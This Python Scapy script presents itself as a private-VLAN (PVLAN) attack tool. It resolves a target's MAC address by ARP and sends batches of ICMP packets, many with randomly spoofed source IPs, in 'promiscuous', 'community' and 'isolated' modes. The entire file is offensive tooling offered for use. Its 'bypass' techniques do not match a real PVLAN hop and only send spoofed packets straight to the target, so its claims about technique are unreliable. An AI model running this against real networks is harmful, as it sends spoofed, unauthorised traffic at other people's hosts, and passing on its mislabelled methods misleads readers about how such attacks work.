from scapy.all import Ether, IP, ICMP, sendp, sniff
import argparse
import random

def execute(args):
    """Execute PVLAN attack"""
    print(f"[PVLAN Attack] Starting on interface {args.interface}")
    
    if not args.target_ip:
        print("[-] Target IP is required for PVLAN attack")
        return False
    
    try:
        target_mac = get_mac(args.target_ip, args.interface)
        if not target_mac:
            print("[-] Could not resolve target MAC address")
            return False
        
        print(f"[PVLAN Attack] Target: {args.target_ip} ({target_mac})")
        
        if args.mode == "promiscuous":
            success = promiscuous_port_attack(args.interface, args.target_ip, target_mac, args.count)
        elif args.mode == "community":
            success = community_vlan_attack(args.interface, args.target_ip, target_mac, args.count)
        else:
            success = isolated_port_attack(args.interface, args.target_ip, target_mac, args.count)
        
        return success
        
    except Exception as e:
        print(f"[PVLAN Attack] Error: {e}")
        return False

def get_mac(ip, interface):
    """Get MAC address for an IP using ARP request"""
    from scapy.all import ARP, srp, Ether
    
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    try:
        answered = srp(arp_request_broadcast, timeout=2, verbose=False, iface=interface)[0]
        return answered[0][1].hwsrc if answered else None
    except:
        return None

def promiscuous_port_attack(interface, target_ip, target_mac, count):
    """Attack from a promiscuous port to bypass PVLAN restrictions"""
    print("[PVLAN Attack] Using promiscuous port attack method")
    
    packets = []
    for i in range(count if count else 100):
        packet = (
            Ether(dst=target_mac) /
            IP(dst=target_ip, src=f"192.168.{random.randint(1, 255)}.{random.randint(1, 254)}") /
            ICMP() /
            b"PVLAN_PROMISCUOUS_ATTACK"
        )
        packets.append(packet)
    
    sendp(packets, iface=interface, verbose=False)
    print(f"[PVLAN Attack] Sent {len(packets)} packets from promiscuous port")
    return True

def community_vlan_attack(interface, target_ip, target_mac, count):
    """Attack within a community VLAN"""
    print("[PVLAN Attack] Using community VLAN attack method")
    
    packets = []
    for i in range(count if count else 100):
        packet = (
            Ether(dst=target_mac) /
            IP(dst=target_ip, src=f"10.0.{random.randint(1, 255)}.{random.randint(1, 254)}") /
            ICMP() /
            b"PVLAN_COMMUNITY_ATTACK"
        )
        packets.append(packet)
    
    sendp(packets, iface=interface, verbose=False)
    print(f"[PVLAN Attack] Sent {len(packets)} packets within community VLAN")
    return True

def isolated_port_attack(interface, target_ip, target_mac, count):
    """Attack from an isolated port"""
    print("[PVLAN Attack] Using isolated port attack method")
    
    packets = []
    for i in range(count if count else 100):
        techniques = [
            # Technique 1: Normal packet
            lambda: Ether(dst=target_mac) / IP(dst=target_ip) / ICMP() / b"PVLAN_ISOLATED_ATTACK_1",
            
            # Technique 2: Packet with TTL=1
            lambda: Ether(dst=target_mac) / IP(dst=target_ip, ttl=1) / ICMP() / b"PVLAN_ISOLATED_ATTACK_2",
            
            # Technique 3: Packet with unusual protocol
            lambda: Ether(dst=target_mac) / IP(dst=target_ip, proto=255) / b"PVLAN_ISOLATED_ATTACK_3",
        ]
        
        packet = random.choice(techniques)()
        packets.append(packet)
    
    sendp(packets, iface=interface, verbose=False)
    print(f"[PVLAN Attack] Sent {len(packets)} packets from isolated port")
    return True

def add_arguments(parser):
    """Add PVLAN attack specific arguments to parser"""
    parser.add_argument("--target-ip", "-ti", required=True, help="Target IP address")
    parser.add_argument("--mode", choices=["promiscuous", "community", "isolated"], 
                       default="isolated", help="PVLAN attack mode")
    parser.add_argument("--count", "-c", type=int, default=100, 
                       help="Number of packets to send")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PVLAN Attack")
    parser.add_argument("--interface", "-i", required=True, help="Network interface")
    parser.add_argument("--target-ip", "-ti", required=True, help="Target IP address")
    parser.add_argument("--mode", choices=["promiscuous", "community", "isolated"], 
                       default="isolated", help="PVLAN attack mode")
    parser.add_argument("--count", "-c", type=int, default=100, 
                       help="Number of packets to send")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    execute(args)